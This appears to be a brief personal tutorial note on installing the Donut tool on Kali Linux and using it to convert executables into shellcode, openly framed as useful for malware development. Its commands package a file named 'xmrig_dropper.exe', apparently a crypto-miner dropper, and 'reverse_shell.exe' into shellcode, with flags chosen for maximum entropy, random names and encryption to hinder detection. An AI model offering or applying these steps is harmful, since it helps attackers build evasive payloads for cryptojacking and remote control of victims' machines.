=======Donut for shellCode Gen==========
- Shellcode is a small, executable piece of machine code, often used as a payload.(Written in Assembly for max efficiency and architecture specification)
- Donut allows us to convert .NET assemblies, EXE or DLL files into shellcode which are useful in malware development.
- On Kali Linux:
	kali> sudo apt install donut

----------Basic Conversion Command------------
- Usage for our first EXE(written in go)
	kali> donut -i xmrig_dropper.exe -o shellcode.bin 
i--> this refers to the input file

	kali> donut -i reverse_shell.exe -o shellcode.bin -e 3 -a 2 -x 1 -b 3 -f 3
-i ----> input file
-o ----->Output file
-e 3 ----> Maximum entropy(random names+encryption)
-a 2 ---->Target machine x64 bit only
-x 1 ----> Exit thread(default cleaner)
